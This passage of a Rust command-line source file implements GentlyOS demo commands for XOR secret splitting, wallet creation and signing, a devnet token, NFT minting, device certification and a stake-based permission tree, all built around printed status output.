        anyhow::bail!("Hash must be 64 hex characters (32 bytes)");
    }

    let mut bytes = [0u8; 32];
    for (i, chunk) in hash.as_bytes().chunks(2).enumerate() {
        let s = std::str::from_utf8(chunk)?;
        bytes[i] = u8::from_str_radix(s, 16)?;
    }

    let pattern = PatternEncoder::encode(&bytes);

    println!("\n  PATTERN ENCODED");
    println!("  Visual: {} ({:?})", pattern.visual.op.name(), pattern.visual.shape);
    println!("  Color: {}", pattern.visual.color.to_hex());
    println!("  Motion: {:?}", pattern.visual.motion);
    println!("  Audio: {:?} @ {}Hz", pattern.audio.op, pattern.audio.frequency.hz());

    let engine = VisualEngine::new(400, 400);
    let svg = engine.render_svg(&pattern);

    match output {
        Some(path) => {
            std::fs::write(&path, &svg)?;
            println!("\n  SVG written to: {}", path);
        }
        None => {
            println!("\n  SVG Preview (first 500 chars):");
            println!("  {}", &svg[..svg.len().min(500)]);
        }
    }

    Ok(())
}

fn cmd_split(secret: String) -> Result<()> {
    if secret.len() != 64 {
        anyhow::bail!("Secret must be 64 hex characters (32 bytes)");
    }

    let mut bytes = [0u8; 32];
    for (i, chunk) in secret.as_bytes().chunks(2).enumerate() {
        let s = std::str::from_utf8(chunk)?;
        bytes[i] = u8::from_str_radix(s, 16)?;
    }

    let (lock, key) = split_secret(&bytes);

    println!("\n  SECRET SPLIT");
    println!("\n  LOCK:");
    let lock_hex: String = lock.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();
    println!("  {}", lock_hex);

    println!("\n  KEY:");
    println!("  {}", key.to_hex());

    println!("\n  XOR these together to recover the original secret.");

    Ok(())
}

fn cmd_combine(lock_hex: String, key_hex: String) -> Result<()> {
    if lock_hex.len() != 64 || key_hex.len() != 64 {
        anyhow::bail!("Both lock and key must be 64 hex characters");
    }

    let mut lock_bytes = [0u8; 32];
    let mut key_bytes = [0u8; 32];

    for (i, chunk) in lock_hex.as_bytes().chunks(2).enumerate() {
        let s = std::str::from_utf8(chunk)?;
        lock_bytes[i] = u8::from_str_radix(s, 16)?;
    }

    for (i, chunk) in key_hex.as_bytes().chunks(2).enumerate() {
        let s = std::str::from_utf8(chunk)?;
        key_bytes[i] = u8::from_str_radix(s, 16)?;
    }

    let lock = Lock::from_bytes(lock_bytes);
    let key = Key::from_bytes(key_bytes);
    let full_secret = lock.combine(&key);

    println!("\n  SECRET RECOVERED");
    let secret_hex: String = full_secret.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();
    println!("  {}", secret_hex);

    Ok(())
}

fn cmd_mint(project: String, visual: String) -> Result<()> {
    println!("Minting NFT for project: {}", project);

    // Get wallet from demo genesis
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);

    // Generate a key for demo
    let mut key = [0u8; 32];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut key);

    // Create unlock contract
    let contract = gently_spl::nft::UnlockContract::open(wallet.pubkey_bytes());

    // Mint NFT
    let nft = GentlyNft::mint(
        &wallet,
        &key,
        visual.clone(),
        contract,
        Some(format!("GentlyOS: {}", project)),
    )?;

    println!("\n  NFT MINTED");
    println!("  Mint: {}", nft.mint_base58());
    println!("  Symbol: {}", nft.metadata.symbol);
    println!("  Visual: {}", visual);
    println!("  Holder: {}", nft.holder_base58());
    println!("\n  QR Code Data:");
    if let Some(qr) = nft.qr_code() {
        println!("  {}", qr);
    }

    println!("\n  Transfer this NFT to grant access.");
    println!("  The holder can extract the KEY with their wallet.");

    Ok(())
}

fn cmd_status() -> Result<()> {
    println!("\n  GENTLYOS STATUS");
    println!("  ================");
    println!();
    println!("  Core: gently-core v0.1.0");
    println!("    XOR split-knowledge: Ready");
    println!("    Pattern encoder: Ready");
    println!();
    println!("  Dance: gently-dance v0.1.0");
    println!("    Protocol state machine: Ready");
    println!("    Contract audit: Ready");
    println!();
    println!("  Audio: gently-audio v0.1.0");
    println!("    FFT decoder: Ready");
    println!("    Audible mode (400-1600Hz): Ready");
    println!("    Ultrasonic mode (18-20kHz): Ready");
    println!();
    println!("  Visual: gently-visual v0.1.0");
    println!("    SVG renderer: Ready");
    println!("    Decoy generator: Ready");
    println!();
    println!("  BTC: gently-btc v0.1.0");
    println!("    Block monitor: Ready");
    println!("    Block promise: Ready");
    println!("    Entropy pool: Ready");
    println!();
    println!("  SPL: gently-spl v0.1.0");
    println!("    Wallet (genesis-locked): Ready");
    println!("    NFT minting: Ready");
    println!("    NFT encryption: Ready");
    println!("    Lock states: Ready");
    println!("    Token (GNTLY): Ready");
    println!("    Certification manager: Ready");
    println!("    Permission stake tree: Ready");
    println!("    Governance (GOS): Ready");
    println!("    GENOS economy: Ready");
    println!();
    println!("  TOKEN NETWORKS:");
    println!("  ---------------");
    println!("    GNTLY:  Certification swaps + permission stakes");
    println!("    GOS:    Governance tokens (folder-level access control)");
    println!("    GENOS:  Proof-of-thought token (AI/GPU economy)");
    println!();
    println!("  DUAL AUDIT SYSTEM:");
    println!("  ------------------");
    println!("    Internal: 1 GNTLY swap per edit (OS self-audit)");
    println!("    External: 1 GNTLY swap per Dance (device-to-device)");
    println!("    Healthy when: internal == external audits");

    Ok(())
}

fn cmd_demo() -> Result<()> {
    println!("\n  DANCE PROTOCOL DEMO");
    println!("  ====================\n");

    // Create a secret and split it
    let mut secret = [0u8; 32];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut secret);
    let (lock, key) = split_secret(&secret);

    println!("  1. Secret split into LOCK + KEY");
    println!("     LOCK (device A): {:02x?}...", &lock.as_bytes()[..4]);
    println!("     KEY  (NFT/pub):  {:02x?}...\n", &key.as_bytes()[..4]);

    // Create contract
    let contract = Contract::new([1u8; 8], "Demo access contract");

    // Create sessions
    let mut lock_session = DanceSession::new_lock_holder(&lock, contract.clone());
    let mut key_session = DanceSession::new_key_holder(&key, contract);

    println!("  2. Sessions created");
    println!("     Lock holder: {:?}", lock_session.state());
    println!("     Key holder:  {:?}\n", key_session.state());

    // Wake the lock
    lock_session.wake()?;
    println!("  3. Lock woken from dormant");
    println!("     Lock holder: {:?}\n", lock_session.state());

    // Simulate dance steps
    println!("  4. Dance begins...");

    // Key holder initiates
    let init = key_session.step(None)?;
    println!("     Key  -> Lock: {:?}", init);

    // Lock holder responds
    let ack = lock_session.step(init)?;
    println!("     Lock -> Key:  {:?}", ack);

    println!("\n  5. Hash exchange would continue...");
    println!("     (8 rounds of visual/audio call-and-response)");

    println!("\n  6. Contract audit");
    println!("     Both devices independently verify:");
    println!("     - Signature valid");
    println!("     - Conditions met");
    println!("     - Not expired");

    println!("\n  7. If both agree: ACCESS GRANTED");
    println!("     FULL_SECRET exists only during dance");
    println!("     Then immediately zeroized");

    // Demonstrate the XOR property
    println!("\n  VERIFICATION:");
    let recovered = lock.combine(&key);
    let recovered_hex: String = recovered.as_bytes().iter().map(|b| format!("{:02x}", b)).collect();
    let original_hex: String = secret.iter().map(|b| format!("{:02x}", b)).collect();
    println!("     Original secret:  {}...", &original_hex[..16]);
    println!("     Recovered secret: {}...", &recovered_hex[..16]);
    println!("     Match: {}", original_hex == recovered_hex);

    Ok(())
}

// ===== WALLET COMMANDS =====

fn cmd_wallet(command: WalletCommands) -> Result<()> {
    match command {
        WalletCommands::Create { network, seed } => cmd_wallet_create(network, seed),
        WalletCommands::Info { file } => cmd_wallet_info(file),
        WalletCommands::Pubkey => cmd_wallet_pubkey(),
        WalletCommands::Sign { message } => cmd_wallet_sign(message),
    }
}

fn cmd_wallet_create(network_str: String, seed: Option<String>) -> Result<()> {
    let network = match network_str.as_str() {
        "devnet" => Network::Devnet,
        "testnet" => Network::Testnet,
        "mainnet" | "mainnet-beta" => Network::Mainnet,
        _ => anyhow::bail!("Unknown network: {}. Use devnet, testnet, or mainnet", network_str),
    };

    println!("\n  CREATING GENTLYOS WALLET");
    println!("  ========================\n");

    // Generate or use provided genesis
    let genesis = match seed {
        Some(s) => {
            println!("  Using seed phrase for deterministic generation...");
            GenesisKey::from_seed(&s, "gently-wallet")
        }
        None => {
            println!("  Generating random genesis key...");
            GenesisKey::generate()
        }
    };

    // Create wallet
    let wallet = GentlyWallet::from_genesis(genesis.as_bytes(), network);

    println!("  Network: {:?}", network);
    println!("  RPC URL: {}", network.rpc_url());
    println!();
    println!("  WALLET CREATED");
    println!("  ==============");
    println!("  Public Key: {}", wallet.pubkey());
    println!("  Derivation: {}", wallet.derivation_path());
    println!();

    // Create wallet store
    let store = WalletStore::new(genesis.as_bytes(), network);
    let json = store.to_json()?;

    println!("  Wallet JSON (save this securely):");
    println!("  {}", json);
    println!();
    println!("  This wallet is LOCKED to your genesis key.");
    println!("  Same genesis = same wallet. Different genesis = different wallet.");
    println!();
    println!("  Fund with SOL on {} to use:", network.name());
    println!("  solana airdrop 1 {} --url {}", wallet.pubkey(), network.rpc_url());

    // Store genesis for demo
    {
        let mut guard = DEMO_GENESIS.lock().unwrap();
        *guard = Some(*genesis.as_bytes());
    }

    Ok(())
}

fn cmd_wallet_info(_file: String) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);

    println!("\n  WALLET INFO");
    println!("  ===========\n");
    println!("  Public Key: {}", wallet.pubkey());
    println!("  Network:    {:?}", wallet.network());
    println!("  Derivation: {}", wallet.derivation_path());
    println!();
    println!("  This wallet is derived from your genesis key.");
    println!("  It can sign transactions for GentlyOS operations.");

    Ok(())
}

fn cmd_wallet_pubkey() -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);

    println!("{}", wallet.pubkey());

    Ok(())
}

fn cmd_wallet_sign(message: String) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);

    let signature = wallet.sign(message.as_bytes());
    let sig_base58 = bs58::encode(&signature).into_string();

    println!("\n  MESSAGE SIGNED");
    println!("  ==============\n");
    println!("  Message:   {}", message);
    println!("  Signer:    {}", wallet.pubkey());
    println!("  Signature: {}", sig_base58);

    Ok(())
}

// ===== TOKEN COMMANDS =====

fn cmd_token(command: TokenCommands) -> Result<()> {
    match command {
        TokenCommands::Balance { pubkey } => cmd_token_balance(pubkey),
        TokenCommands::Airdrop { amount } => cmd_token_airdrop(amount),
        TokenCommands::Transfer { to, amount } => cmd_token_transfer(to, amount),
        TokenCommands::Stake { amount } => cmd_token_stake(amount),
        TokenCommands::Info => cmd_token_info(),
    }
}

fn cmd_token_balance(pubkey: Option<String>) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);

    with_demo_token(|token| {
        let pk = pubkey.unwrap_or_else(|| wallet.pubkey());
        let balance = token.balance(&pk);

        println!("\n  GNTLY BALANCE");
        println!("  =============\n");
        println!("  Wallet:  {}", pk);
        println!("  Balance: {}", balance);
        println!("  Network: {:?}", token.network());
    });

    Ok(())
}

fn cmd_token_airdrop(amount: f64) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);

    let amount = TokenAmount::from_gntly(amount);
    with_demo_token(|token| {
        token.airdrop(&wallet.pubkey(), amount).ok();

        println!("\n  AIRDROP SUCCESSFUL");
        println!("  ==================\n");
        println!("  Recipient: {}", wallet.pubkey());
        println!("  Amount:    {}", amount);
        println!("  New Balance: {}", token.balance(&wallet.pubkey()));
        println!();
        println!("  (Devnet only - for testing purposes)");
    });

    Ok(())
}

fn cmd_token_transfer(to: String, amount: f64) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);

    let amount = TokenAmount::from_gntly(amount);

    // Sign the transfer
    let message = format!("transfer:{}:{}:{}", wallet.pubkey(), to, amount.lamports());
    let signature = wallet.sign(message.as_bytes());

    with_demo_token(|token| {
        if let Ok(receipt) = token.transfer(&wallet.pubkey(), &to, amount, &signature) {
            println!("\n  TRANSFER SUCCESSFUL");
            println!("  ===================\n");
            println!("  From:      {}", receipt.from);
            println!("  To:        {}", receipt.to);
            println!("  Amount:    {}", receipt.amount);
            println!("  Signature: {}...", &receipt.signature[..16]);
            println!();
            println!("  Your new balance: {}", token.balance(&wallet.pubkey()));
        }
    });

    Ok(())
}

fn cmd_token_stake(amount: f64) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);

    let amount = TokenAmount::from_gntly(amount);
    with_demo_token(|token| {
        if let Ok(receipt) = token.stake(&wallet.pubkey(), amount) {
            println!("\n  STAKE SUCCESSFUL");
            println!("  ================\n");
            println!("  Staker: {}", receipt.staker);
            println!("  Amount: {}", receipt.amount);
            println!();
            println!("  You now have access to hive queries!");
            println!("  Remaining balance: {}", token.balance(&wallet.pubkey()));
        }
    });

    Ok(())
}

fn cmd_token_info() -> Result<()> {
    use gently_spl::token::pricing;

    println!("\n  GNTLY TOKEN INFO");
    println!("  =================\n");
    println!("  Name:     GentlyOS Token");
    println!("  Symbol:   GNTLY");
    println!("  Decimals: 9");
    println!("  Network:  Solana Devnet");
    println!();
    println!("  PRICING:");
    println!("  ---------");
    println!("  Hive Query:      {}", pricing::HIVE_QUERY);
    println!("  Chain Submit:    {}", pricing::CHAIN_SUBMIT);
    println!("  Chain Reward:    {}", pricing::CHAIN_REWARD);
    println!("  Minimum Stake:   {}", pricing::MIN_STAKE);
    println!("  Premium Monthly: {}", pricing::PREMIUM_MONTHLY);
    println!();
    println!("  Use 'gently token airdrop' to get test tokens on devnet.");

    Ok(())
}

// ===== CERTIFICATION COMMANDS =====

fn cmd_certify(command: CertifyCommands) -> Result<()> {
    match command {
        CertifyCommands::Init { peer } => cmd_certify_init(peer),
        CertifyCommands::Complete { session } => cmd_certify_complete(session),
        CertifyCommands::Abort { session } => cmd_certify_abort(session),
        CertifyCommands::History => cmd_certify_history(),
        CertifyCommands::Info => cmd_certify_info(),
    }
}

fn cmd_certify_init(peer: String) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);
    let my_pubkey = wallet.pubkey();

    // Generate session hash
    let mut session_hash = [0u8; 32];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut session_hash);
    let session_hex: String = session_hash.iter().map(|b| format!("{:02x}", b)).collect();

    with_demo_certification(|manager| {
        // Ensure both parties have tokens for the dance
        if !manager.token().balance(&my_pubkey).sufficient_for(gently_spl::token::certification::DANCE_SWAP) {
            manager.token().airdrop(&my_pubkey, TokenAmount::from_gntly(1.0)).ok();
        }
        if !manager.token().balance(&peer).sufficient_for(gently_spl::token::certification::DANCE_SWAP) {
            manager.token().airdrop(&peer, TokenAmount::from_gntly(1.0)).ok();
        }

        if let Ok(record) = manager.init_dance(&my_pubkey, &peer, session_hash) {
            println!("\n  DANCE CERTIFICATION INITIATED");
            println!("  ==============================\n");
            println!("  Device A (you):  {}", my_pubkey);
            println!("  Device B (peer): {}", peer);
            println!("  Session Hash:    {}", session_hex);
            println!("  Status:          {:?}", record.status);
            println!();
            println!("  Swap amount: {} (each direction)", record.swap_a_to_b);
            println!();
            println!("  To complete the dance:");
            println!("    gently certify complete {}", session_hex);
            println!();
            println!("  To abort:");
            println!("    gently certify abort {}", session_hex);
        }
    });

    Ok(())
}

fn cmd_certify_complete(session: String) -> Result<()> {
    if session.len() != 64 {
        anyhow::bail!("Session hash must be 64 hex characters");
    }

    let mut session_hash = [0u8; 32];
    for (i, chunk) in session.as_bytes().chunks(2).enumerate() {
        let s = std::str::from_utf8(chunk)?;
        session_hash[i] = u8::from_str_radix(s, 16)?;
    }

    with_demo_certification(|manager| {
        if let Ok(record) = manager.complete_dance(&session_hash) {
            println!("\n  DANCE CERTIFICATION COMPLETE");
            println!("  =============================\n");
            println!("  Device A: {}", record.device_a);
            println!("  Device B: {}", record.device_b);
            println!("  Status:   {:?}", record.status);
            println!();
            println!("  Tokens swapped: {} each direction", record.swap_a_to_b);
            println!("  Both devices received verification bonus!");
            println!();
            println!("  New balances:");
            println!("    Device A: {}", manager.token().balance(&record.device_a));
            println!("    Device B: {}", manager.token().balance(&record.device_b));
            println!();
            println!("  This certification is recorded on-chain.");
            println!("  Both devices can now prove mutual verification.");
        }
    });

    Ok(())
}

fn cmd_certify_abort(session: String) -> Result<()> {
    if session.len() != 64 {
        anyhow::bail!("Session hash must be 64 hex characters");
    }

    let mut session_hash = [0u8; 32];
    for (i, chunk) in session.as_bytes().chunks(2).enumerate() {
        let s = std::str::from_utf8(chunk)?;
        session_hash[i] = u8::from_str_radix(s, 16)?;
    }

    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);
    let my_pubkey = wallet.pubkey();

    with_demo_certification(|manager| {
        if manager.abort_dance(&session_hash, &my_pubkey).is_ok() {
            println!("\n  DANCE CERTIFICATION ABORTED");
            println!("  ============================\n");
            println!("  Session:  {}", session);
            println!("  Aborter:  {}", my_pubkey);
            println!();
            println!("  Penalty applied: {}", gently_spl::token::certification::ABORT_PENALTY);
            println!("  Your new balance: {}", manager.token().balance(&my_pubkey));
        }
    });

    Ok(())
}

fn cmd_certify_history() -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);
    let my_pubkey = wallet.pubkey();

    with_demo_certification(|manager| {
        let history = manager.history(&my_pubkey);

        println!("\n  CERTIFICATION HISTORY");
        println!("  =====================\n");
        println!("  Device: {}", my_pubkey);
        println!("  Total certifications: {}", history.len());
        println!("  Verified: {}", manager.verified_count(&my_pubkey));
        println!();

        if history.is_empty() {
            println!("  No certifications yet.");
            println!("  Use 'gently certify init <peer>' to start a Dance.");
        } else {
            for (i, record) in history.iter().enumerate() {
                let session_hex: String = record.session_hash.iter().map(|b| format!("{:02x}", b)).collect();
                let peer = if record.device_a == my_pubkey {
                    &record.device_b
                } else {
                    &record.device_a
                };

                println!("  [{}] Status: {:?}", i + 1, record.status);
                println!("      Peer: {}...", &peer[..16]);
                println!("      Session: {}...", &session_hex[..16]);
                println!("      Swapped: {}", record.swap_a_to_b);
                println!();
            }
        }
    });

    Ok(())
}

fn cmd_certify_info() -> Result<()> {
    use gently_spl::token::certification;

    println!("\n  DANCE CERTIFICATION INFO");
    println!("  =========================\n");
    println!("  Dance certification proves two devices mutually verified");
    println!("  each other via the visual-audio handshake protocol.");
    println!();
    println!("  HOW IT WORKS:");
    println!("  -------------");
    println!("  1. Device A initiates dance with Device B");
    println!("  2. Both devices escrow {} GNTLY", certification::DANCE_SWAP);
    println!("  3. Dance protocol executes (visual/audio handshake)");
    println!("  4. On success: tokens swap, both get bonus");
    println!("  5. On abort: aborter pays penalty");
    println!();
    println!("  PRICING:");
    println!("  --------");
    println!("  Dance Swap:         {}", certification::DANCE_SWAP);
    println!("  Verification Bonus: {}", certification::VERIFICATION_BONUS);
    println!("  Abort Penalty:      {}", certification::ABORT_PENALTY);
    println!();
    println!("  The token swap creates an on-chain proof that both");
    println!("  devices successfully verified each other.");
    println!();
    println!("  Mainnet stake required for devnet access: {}",
             gently_spl::token::pricing::DEVNET_UNLOCK_STAKE);

    Ok(())
}

// ===== PERMISSION COMMANDS =====

fn cmd_perm(command: PermCommands) -> Result<()> {
    match command {
        PermCommands::Init { stake } => cmd_perm_init(stake),
        PermCommands::Add { path, owner, dir } => cmd_perm_add(path, owner, dir),
        PermCommands::Edit { path } => cmd_perm_edit(path),
        PermCommands::Tree => cmd_perm_tree(),
        PermCommands::Audits => cmd_perm_audits(),
        PermCommands::Health => cmd_perm_health(),
        PermCommands::Info => cmd_perm_info(),
    }
}

fn cmd_perm_init(stake: f64) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);
    let my_pubkey = wallet.pubkey();

    let stake_amount = TokenAmount::from_gntly(stake);
    init_demo_permissions(&my_pubkey, stake_amount);

    println!("\n  PERMISSION TREE INITIALIZED");
    println!("  ============================\n");
    println!("  Root Owner: {}", my_pubkey);
    println!("  Total Stake: {}", stake_amount);
    println!();
    println!("  STAKE DISTRIBUTION:");
    println!("  -------------------");
    println!("  Root (/): 51% = {}", TokenAmount::from_gntly(stake * 0.51_f64));
    println!("  Available for children: 49% = {}", TokenAmount::from_gntly(stake * 0.49_f64));
    println!();
    println!("  Use 'gently perm add <path>' to add directories/files.");
    println!("  Use 'gently perm tree' to view the stake hierarchy.");

    Ok(())
}

fn cmd_perm_add(path: String, owner: Option<String>, is_dir: bool) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);
    let owner = owner.unwrap_or_else(|| wallet.pubkey());

    let result = with_demo_permissions(|manager| {
        manager.add_path(&path, is_dir, &owner).ok()?;
        let node = manager.tree().get(&path)?;
        Some((node.generation, node.stake_percent, node.stake_tokens))
    });

    match result {
        Some(Some((generation, stake_percent, stake_tokens))) => {
            println!("\n  PATH ADDED TO PERMISSION TREE");
            println!("  ==============================\n");
            println!("  Path:       {}", path);
            println!("  Type:       {}", if is_dir { "Directory" } else { "File" });
            println!("  Owner:      {}...", &owner[..16.min(owner.len())]);
            println!("  Generation: {}", generation);
            println!("  Stake:      {:.4}% = {}", stake_percent * 100.0_f64, stake_tokens);
            println!();
            println!("  Min stake to edit: {}", stake_tokens);
        }
        _ => {
            anyhow::bail!("Permission tree not initialized. Run 'gently perm init' first.");
        }
    }

    Ok(())
}

fn cmd_perm_edit(path: String) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);
    let my_pubkey = wallet.pubkey();

    let found = with_demo_permissions(|manager| {
        let result = manager.edit(&path, &my_pubkey).ok()?;

        println!("\n  EDIT ATTEMPT");
        println!("  ============\n");
        println!("  Path:   {}", path);
        println!("  Editor: {}...", &my_pubkey[..16]);
        println!();

        if result.success {
            println!("  STATUS: SUCCESS");
            println!();
            println!("  Required stake: {}", result.validation.required_stake);
            println!("  Your stake:     {}", result.validation.editor_stake);

            if let Some(audit) = result.internal_audit {
                println!();
                println!("  INTERNAL AUDIT RECORDED:");
                println!("    Audit #{}  (swap: {})", audit.audit_number, audit.swap_amount);
            }

            if let Some(redist) = result.validation.stake_redistribution {
                println!();
                println!("  STAKE REDISTRIBUTION:");
                for (p, amount) in &redist.new_distribution {
                    println!("    {}: {}", p, amount);
                }
            }

            let health = manager.health_check();
            if !health.balanced {
                println!();
                println!("  WARNING: System unbalanced!");
                println!("    Internal audits: {}", health.internal_audits);
                println!("    External audits: {}", health.external_audits);
                println!("    Run 'gently certify init <peer>' to balance with Dance.");
            }
        } else {
            println!("  STATUS: DENIED");
            println!();
            println!("  {}", result.message);
            println!();
            println!("  Required stake: {}", result.validation.required_stake);
            println!("  Your stake:     {}", result.validation.editor_stake);
            println!();
            println!("  Acquire more stake to edit this path.");
        }
        Some(())
    });

    if found.is_none() {
        anyhow::bail!("Permission tree not initialized. Run 'gently perm init' first.");
    }

    Ok(())
}

fn cmd_perm_tree() -> Result<()> {
    let found = with_demo_permissions(|manager| {
        let report = manager.tree().stake_report();

        println!("\n  PERMISSION STAKE TREE");
        println!("  =====================\n");

        for entry in &report {
            let indent = "  ".repeat(entry.generation as usize + 1);
            let type_char = if entry.children > 0 { "+" } else { "-" };

            println!("{}[{}] {} ({:.2}% = {})",
                indent,
                type_char,
                entry.path,
                entry.stake_percent * 100.0_f64,
                entry.stake_tokens
            );

            if entry.edit_count > 0 {
                println!("{}     edits: {}", indent, entry.edit_count);
            }
        }

        println!();
        println!("  Legend: [+] has children, [-] leaf node");
    });

    if found.is_none() {
        anyhow::bail!("Permission tree not initialized. Run 'gently perm init' first.");
    }

    Ok(())
}

fn cmd_perm_audits() -> Result<()> {
    let found = with_demo_permissions(|manager| {
        let audits = manager.audit_history();

        println!("\n  AUDIT HISTORY");
        println!("  ==============\n");

        if audits.is_empty() {
            println!("  No audits recorded yet.");
            println!("  Edits trigger internal audits.");
            println!("  Dance certifications trigger external audits.");
        } else {
            for audit in audits {
                let type_str = match audit.audit_type {
                    AuditType::Internal => "INTERNAL",
                    AuditType::External => "EXTERNAL",
                };

                println!("  [{}] #{} - {} ({})",
                    type_str,
                    audit.audit_number,
                    audit.path,
                    audit.swap_amount
                );
                println!("       Editor: {}...", &audit.editor[..16.min(audit.editor.len())]);
                println!();
            }
        }

        let health = manager.health_check();
        println!("  TOTALS:");
        println!("    Internal: {}", health.internal_audits);
        println!("    External: {}", health.external_audits);
        println!("    Balanced: {}", if health.balanced { "YES" } else { "NO - needs Dance!" });
    });

    if found.is_none() {
        anyhow::bail!("Permission tree not initialized. Run 'gently perm init' first.");
    }

    Ok(())
}

fn cmd_perm_health() -> Result<()> {
    let found = with_demo_permissions(|manager| {
        let health = manager.health_check();

        println!("\n  SYSTEM HEALTH CHECK");
        println!("  ====================\n");

        let status = if health.balanced { "HEALTHY" } else { "UNBALANCED" };
        let status_icon = if health.balanced { "[OK]" } else { "[!!]" };

        println!("  {} Status: {}", status_icon, status);
        println!();
        println!("  METRICS:");
        println!("  ---------");
        println!("  Total nodes:      {}", health.total_nodes);
        println!("  Total stake:      {}", health.total_stake);
        println!("  Internal audits:  {}", health.internal_audits);
        println!("  External audits:  {}", health.external_audits);
        println!();

        if !health.balanced {
            let diff = (health.internal_audits as i64 - health.external_audits as i64).abs();
            println!("  IMBALANCE DETECTED:");
            println!("  -------------------");
            println!("  {} Dance certifications needed to rebalance.", diff);
            println!();
            println!("  Run 'gently certify init <peer>' for each.");
            println!();
            println!("  Every edit requires 1 internal + 1 external audit.");
            println!("  This ensures continuous security validation.");
        } else {
            println!("  System is in balance.");
            println!("  Internal and external audits are equal.");
            println!("  Security validation is current.");
        }
    });

    if found.is_none() {
        anyhow::bail!("Permission tree not initialized. Run 'gently perm init' first.");
    }

    Ok(())
}

fn cmd_perm_info() -> Result<()> {
    use gently_spl::permissions::{ROOT_STAKE_PERCENT, AUDIT_SWAP_AMOUNT};

    println!("\n  HIERARCHICAL PERMISSION STAKE SYSTEM");
    println!("  =====================================\n");

    println!("  CONCEPT:");
    println!("  ---------");
    println!("  Devnet GNTLY tokens represent permission stake.");
    println!("  Edit rights are determined by stake ownership.");
    println!("  Root always holds 51% (controlling interest).");
    println!();

    println!("  STAKE DISTRIBUTION:");
    println!("  -------------------");
    println!("  Root (/):         {:.0}%", ROOT_STAKE_PERCENT * 100.0_f64);
    println!("  Children split:   {:.0}%", (1.0_f64 - ROOT_STAKE_PERCENT) * 100.0_f64);
    println!("  Each generation gets progressively less stake.");
    println!();

    println!("  EDIT RULES:");
    println!("  -----------");
    println!("  • Must hold >= required stake to edit");
    println!("  • Edits in directories split value among children");
    println!("  • Root stake is immutable (always 51%)");
    println!();

    println!("  DUAL AUDIT SYSTEM:");
    println!("  ------------------");
    println!("  Every edit triggers:");
    println!("    1. INTERNAL audit ({} swap within OS)", AUDIT_SWAP_AMOUNT);
    println!("    2. EXTERNAL audit ({} Dance with peer)", AUDIT_SWAP_AMOUNT);
    println!();
    println!("  System is healthy when internal == external audits.");
    println!("  Unbalanced system needs Dance certifications.");
    println!();

    println!("  COMMANDS:");
    println!("  ---------");
    println!("  gently perm init        - Initialize tree with stake");
    println!("  gently perm add <path>  - Add path to tree");
    println!("  gently perm edit <path> - Attempt edit (triggers audit)");
    println!("  gently perm tree        - View stake hierarchy");
    println!("  gently perm audits      - View audit history");
    println!("  gently perm health      - Check system balance");

    Ok(())
}

// Import bs58 for base58 encoding in sign command
use bs58;

// ===== GENOS COMMANDS =====

fn with_demo_genos<F, R>(f: F) -> R
where
    F: FnOnce(&mut GenosEconomy) -> R,
{
    let mut guard = DEMO_GENOS.lock().unwrap();
    if guard.is_none() {
        *guard = Some(GenosEconomy::new(Network::Devnet));
    }
    f(guard.as_mut().unwrap())
}

fn cmd_genos(command: GenosCommands) -> Result<()> {
    match command {
        GenosCommands::Balance => cmd_genos_balance(),
        GenosCommands::Contribute { kind, title } => cmd_genos_contribute(kind, title),
        GenosCommands::GpuRegister { model, vram, rate } => cmd_genos_gpu_register(model, vram, rate),
        GenosCommands::GpuJob { kind, hours, budget } => cmd_genos_gpu_job(kind, hours, budget),
        GenosCommands::Vector { metadata } => cmd_genos_vector(metadata),
        GenosCommands::Stats => cmd_genos_stats(),
        GenosCommands::Info => cmd_genos_info(),
    }
}

fn cmd_genos_balance() -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);
    let my_pubkey = wallet.pubkey();

    with_demo_genos(|economy| {
        // Ensure user has a wallet
        let genos_wallet = economy.get_or_create_wallet(&my_pubkey);

        println!("\n  GENOS BALANCE");
        println!("  =============\n");
        println!("  Wallet:    {}...", &my_pubkey[..24]);
        println!("  Balance:   {}", genos_wallet.balance);
        println!("  Total Earned: {}", genos_wallet.total_earned);
        println!("  Total Spent:  {}", genos_wallet.total_spent);
        println!();
        println!("  ACTIVITY:");
        println!("  ----------");
        println!("  Contributions:  {}", genos_wallet.contribution_count);
        println!("  GPU Hours:      {}", genos_wallet.gpu_hours_provided);
        println!("  Vector Chains:  {}", genos_wallet.vector_chains);
        println!("  Reputation:     {:.2}", genos_wallet.reputation);
    });

    Ok(())
}

fn cmd_genos_contribute(kind: String, title: String) -> Result<()> {
    let genesis = get_demo_genesis();
    let wallet = GentlyWallet::from_genesis(&genesis, Network::Devnet);
    let my_pubkey = wallet.pubkey();

    let contrib_type = match kind.to_lowercase().as_str() {
        "thought" | "creative" => ContributionType::CreativeThought,
        "report" => ContributionType::Report,
        "code" => ContributionType::Code,
        "design" => ContributionType::Design,
        "research" => ContributionType::Research,
